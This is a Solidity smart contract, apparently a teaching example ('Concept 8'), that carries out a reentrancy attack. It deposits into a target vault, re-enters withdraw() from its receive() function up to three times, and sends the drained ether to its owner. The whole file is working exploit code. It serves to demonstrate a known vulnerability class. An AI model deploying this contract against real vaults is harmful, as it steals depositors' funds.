// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {IWithdrawable} from "./IWithdrawable.sol";

contract ReentrancyAttacker {
    IWithdrawable public immutable target;
    address public immutable owner;
    uint256 public depositAmount;
    uint8 public reentryCount;

    uint8 constant MAX_REENTRIES = 3;

    constructor(address vaultAddress) {
        target = IWithdrawable(vaultAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        depositAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (reentryCount < MAX_REENTRIES && address(target).balance >= depositAmount) {
            reentryCount += 1;
            target.withdraw();   // Concept 8: re-enters before the vault has zeroed our balance
        }
    }

    function collect() external {
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "collect failed");
    }
}